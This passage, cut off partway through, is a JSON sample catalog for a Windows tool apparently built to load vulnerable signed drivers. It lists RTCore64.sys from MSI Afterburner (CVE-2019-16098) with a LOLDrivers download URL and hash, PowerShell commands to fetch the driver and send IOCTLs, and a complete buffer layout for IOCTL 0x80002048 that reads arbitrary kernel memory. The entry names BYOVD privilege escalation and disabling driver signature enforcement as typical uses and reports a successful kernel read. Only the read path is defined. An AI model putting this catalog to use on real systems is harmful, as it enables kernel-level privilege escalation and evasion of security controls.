{
  "schema": 2,
  "name": "LocalConfigTool 内置样本目录（预置规则 + 已验证 profile）",
  "note": "这里只放规则与**纯数据 profile**（名称/CVE/来源/哈希/风险/动作结构），不放可执行载荷。载荷由 samples.get 按需获取并强制 SHA256 校验；条目若自带 profile，会在下载成功后自动落盘到 var\\driver-profiles\\，于是拿到样本就能直接发 action，不用自己写结构体 JSON。用户也可以在 var\\samples\\catalog.local.json 里追加条目（同名 id 以本地为准）。",
  "howto": [
    "界面：第 4 页「样本库」→ 选一行 → ① 刷新 ② 预览 ③ 获取并校验（哈希不符会丢弃）④ 生成 profile",
    "命令行：core\\Engine.ps1 -Verb samples.list",
    "命令行：core\\Engine.ps1 -Verb samples.get -ArgsFile a.json [-Apply]   （a.json = {\"id\":\"rtcore64-01aa278b\"}）",
    "发动作（不加 -Apply 只预览、绝不发 IOCTL）：",
    "  c.json = {\"profile\":\"rtcore64-01aa278b\",\"action\":\"kread\",\"payload\":\"addr=@ntoskrnl,readSize=4\"}",
    "  core\\Engine.ps1 -Verb driver.ctl.send -ArgsFile c.json [-Apply]",
    "payload 三种写法：JSON 对象 / 简写 key=value / 省略（用 profile 里的 presets）；值写 @ntoskrnl 自动取内核基址"
  ],
  "entries": [
    {
      "id": "rtcore64-01aa278b",
      "name": "RTCore64.sys（MSI Afterburner 4.6.2.15658 的驱动）",
      "cve": ["CVE-2019-16098"],
      "tags": ["byovd", "lpe", "kernel-rw"],
      "os": ["Windows 10 19045", "Windows 11"],
      "capability": [
        "任意内核内存读写（4 字节粒度）",
        "MSR / I/O 端口读写",
        "常被用于 BYOVD 提权与关闭 DSE"
      ],
      "risk": "high",
      "verified": true,
      "url": "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/2d8e4f38b36c334d0a32a7324832501d.bin",
      "sha256": "01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd",
      "notes": "本机已实测：driver.use 加载成功、kread(0x80002048) 在 ntoskrnl 基址读回 0x00905A4D（MZ）。设备 \\Device\\RTCore64。测完立刻 driver.cleanup（或 driver.release -Path）。",
      "profile": {
        "id": "rtcore64-01aa278b",
        "kind": "driver-profile",
        "engineApi": 2,
        "target": {
          "sha256": "01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd",
          "fileName": "RTCore64.sys"
        },
        "locate": {
          "strategy": "symlink",
          "candidates": ["\\??\\RTCore64"],
          "serviceNameHint": "lctrtc64",
          "notes": "设备名由驱动自身创建，与服务名无关"
        },
        "actions": {
          "kread": {
            "ioctl": "0x80002048",
            "require": ["addr"],
            "presets": { "readSize": 4, "offset": 0 },
            "in": [
              { "name": "pad0", "type": "bytes", "len": 8 },
              { "name": "addr", "type": "u64" },
              { "name": "pad1", "type": "u32" },
              { "name": "offset", "type": "u32" },
              { "name": "readSize", "type": "u32" },
              { "name": "value", "type": "u32" },
              { "name": "pad3", "type": "bytes", "len": 16 }
            ],
            "out": [
              { "name": "pad0", "type": "bytes", "len": 8 },
              { "name": "addr", "type": "u64" },
              { "name": "pad1", "type": "u32" },
              { "name": "offset", "type": "u32" },
              { "name": "readSize", "type": "u32" },
              { "name": "value", "type": "u32" },
              { "name": "pad3", "type": "bytes", "len": 16 }
            ]
          }
        },
        "layout": { "method": "buffered", "align": 8, "endian": "little" },
        "risk": {
          "level": "medium",
          "notes": "只实现读 0x80002048；结构体取自 EDRSandblast DriverRTCore.c（该文件头标注的 SHA256 与本样本一致，版本匹配）；写 0x8000204C 不实现"
        },
        "requires": { "restart": false, "admin": true, "elevation": "admin" }
      }
    },
    {
